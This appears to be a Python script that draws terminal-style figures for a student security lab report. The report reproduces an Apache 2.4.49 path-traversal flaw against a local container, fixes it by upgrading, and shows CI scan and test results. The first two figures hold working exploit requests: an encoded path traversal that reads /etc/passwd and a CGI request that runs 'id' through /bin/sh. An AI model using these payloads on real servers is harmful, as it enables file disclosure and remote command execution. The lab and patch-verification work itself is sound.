#!/usr/bin/env python3
"""Render recorded lab output into terminal-style PNG figures for the report."""
import os
from PIL import Image, ImageDraw, ImageFont

FONT_PATH = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"
FONT_SIZE = 16
LINE_H = 24
PAD = 24
TITLE_H = 44
BG = (16, 20, 24)
BAR = (34, 41, 49)
FG = (222, 226, 230)
FG_DIM = (150, 160, 170)
FG_OK = (126, 231, 135)
FG_ERR = (255, 123, 114)
FG_CMD = (121, 192, 255)

OUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "images")
os.makedirs(OUT_DIR, exist_ok=True)


def render(name: str, title: str, lines: list[tuple[str, str]]) -> None:
    font = ImageFont.truetype(FONT_PATH, FONT_SIZE)
    width = 1180
    height = TITLE_H + PAD * 2 + LINE_H * len(lines)
    img = Image.new("RGB", (width, height), BG)
    draw = ImageDraw.Draw(img)

    draw.rectangle([0, 0, width, TITLE_H], fill=BAR)
    draw.text((PAD, 12), title, font=font, fill=FG)

    y = TITLE_H + PAD
    colors = {
        "cmd": FG_CMD,
        "ok": FG_OK,
        "err": FG_ERR,
        "dim": FG_DIM,
        "out": FG,
    }
    for kind, text in lines:
        draw.text((PAD, y), text, font=font, fill=colors.get(kind, FG))
        y += LINE_H

    path = os.path.join(OUT_DIR, f"{name}.png")
    img.save(path)
    print("saved", path)


FIGURES = {
    "fig1_vulnerable_lfi": (
        "Vulnerable Apache 2.4.49 - arbitrary file disclosure (recorded output)",
        [
            ("cmd", '$ curl -sv --path-as-is "http://localhost:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"'),
            ("dim", "*   Trying 127.0.0.1:8080..."),
            ("dim", "> GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1"),
            ("out", "< HTTP/1.1 200 OK"),
            ("out", "< Server: Apache/2.4.49 (Unix)"),
            ("out", "< Content-Length: 926"),
            ("out", ""),
            ("ok", "root:x:0:0:root:/root:/bin/bash"),
            ("ok", "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"),
            ("ok", "bin:x:2:2:bin:/bin:/usr/sbin/nologin"),
            ("err", "-> /etc/passwd of the container disclosed (attack succeeded)"),
        ],
    ),
    "fig2_vulnerable_rce": (
        "Vulnerable Apache 2.4.49 - remote command execution via CGI (recorded output)",
        [
            ("cmd", '$ curl -sv --data "echo;id" "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"'),
            ("dim", "> POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"),
            ("out", "< HTTP/1.1 200 OK"),
            ("out", "< Server: Apache/2.4.49 (Unix)"),
            ("out", ""),
            ("ok", "uid=1(daemon) gid=1(daemon) groups=1(daemon)"),
            ("err", "-> /bin/sh executed inside the container (attack succeeded)"),
        ],
    ),
    "fig3_fixed_blocked": (
        "Fixed Apache 2.4.51 - both attacks rejected (recorded output)",
        [
            ("cmd", '$ curl -sv --path-as-is "http://localhost:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"'),
            ("out", "< HTTP/1.1 400 Bad Request"),
            ("out", "< Server: Apache/2.4.51 (Unix)"),
            ("ok", "-> path traversal rejected, no file content returned"),
            ("out", ""),
            ("cmd", '$ curl -sv --data "echo;id" "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"'),
            ("out", "< HTTP/1.1 400 Bad Request"),
            ("out", "< Server: Apache/2.4.51 (Unix)"),
            ("ok", "-> CGI command execution rejected, no command output"),
        ],
    ),
    "fig4_regression": (
        "Fixed Apache 2.4.51 - regression test, normal function works (recorded output)",
        [
            ("cmd", '$ curl -s -o /dev/null -w "%{http_code}\\n" http://localhost:8080/'),
            ("ok", "200"),
            ("cmd", "$ curl -s http://localhost:8080/"),
            ("out", "<html><body><h1>It works!</h1></body></html>"),
            ("cmd", "$ docker compose exec -T apache httpd -v"),
            ("out", "Server version: Apache/2.4.51 (Unix)"),
            ("cmd", "$ docker compose exec -T apache httpd -M | grep cgi"),
            ("out", " cgid_module (shared)"),
            ("dim", "-> normal pages and CGI modules intact after the upgrade"),
        ],
    ),
    "fig5_ci_run": (
        "GitHub Actions run 39364162980 (recorded CLI output)",
        [
            ("cmd", "$ gh run view 39364162980"),
            ("out", "✓ master Secure REST API CI Pipeline · 39364162980"),
            ("out", ""),
            ("out", "JOBS"),
            ("ok", "✓ Security Scanners & Unit Tests in 19s (ID 118436996260)"),
            ("out", ""),
            ("dim", "View this run on GitHub:"),
            ("dim", "https://github.com/guanyuanpeterpan/hdu-is-work1-api/actions/runs/39364162980"),
        ],
    ),
    "fig6_sast_sca": (
        "CI security scanners - SAST (Bandit) and SCA (pip-audit) (recorded output)",
        [
            ("cmd", "$ uv run bandit -r app/ -v"),
            ("out", "Run started:2026-10-19 03:50:49"),
            ("out", "Test results:"),
            ("ok", "        No issues identified."),
            ("out", "Code scanned:"),
            ("out", "        Total lines of code: 272"),
            ("out", "        Total issues (by severity): High: 0  Medium: 0  Low: 0"),
            ("out", ""),
            ("cmd", "$ uv run pip-audit"),
            ("ok", "No known vulnerabilities found"),
        ],
    ),
    "fig7_pytest": (
        "CI automated tests - pytest (recorded output)",
        [
            ("cmd", "$ uv run pytest -v"),
            ("out", "tests/test_articles.py::test_create_article_unauthorized PASSED"),
            ("out", "tests/test_articles.py::test_create_article_success PASSED"),
            ("out", "tests/test_articles.py::test_sqli_protection PASSED"),
            ("out", "tests/test_articles.py::test_xss_protection PASSED"),
            ("out", "tests/test_auth.py::test_login_success PASSED"),
            ("out", "tests/test_auth.py::test_login_wrong_password PASSED"),
            ("out", "tests/test_auth.py::test_login_nonexistent_user PASSED"),
            ("out", "tests/test_auth.py::test_expired_token_rejection PASSED"),
            ("out", "tests/test_auth.py::test_tampered_token_rejection PASSED"),
            ("out", "tests/test_data.py::test_get_data_unauthorized PASSED"),
            ("out", "tests/test_data.py::test_get_data_invalid_scheme PASSED"),
            ("out", "tests/test_data.py::test_get_data_authorized PASSED"),
            ("ok", "======================== 12 passed, 1 warning in 3.13s ========================"),
        ],
    ),
}

if __name__ == "__main__":
    for name, (title, lines) in FIGURES.items():
        render(name, title, lines)
